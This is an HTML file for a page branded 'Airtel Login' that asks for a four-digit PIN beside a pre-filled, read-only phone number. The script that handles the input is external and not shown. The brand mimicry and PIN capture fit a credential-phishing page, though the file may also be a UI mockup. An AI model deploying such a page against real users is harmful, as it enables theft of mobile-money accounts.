<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Airtel Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/airtel.css">
</head>
<body>

<div class="airtel-container">
    <h1 class="airtel-logo">Airtel</h1>

    <h2 class="welcome-text">Welcome</h2>

    <input
        type="text"
        class="phone-input"
        value="+260877458756"
        readonly
    />

    <p class="pin-label">Enter your PIN</p>

    <div class="pin-box">
        <input type="password" maxlength="1" class="pin">
        <input type="password" maxlength="1" class="pin">
        <input type="password" maxlength="1" class="pin">
        <input type="password" maxlength="1" class="pin">
    </div>

    <a href="#" class="forgot-pin">Forgot PIN?</a>

    <button class="login-btn" disabled>Login</button>
</div>

<script src="assets/js/airtel.js"></script>
</body>
</html>
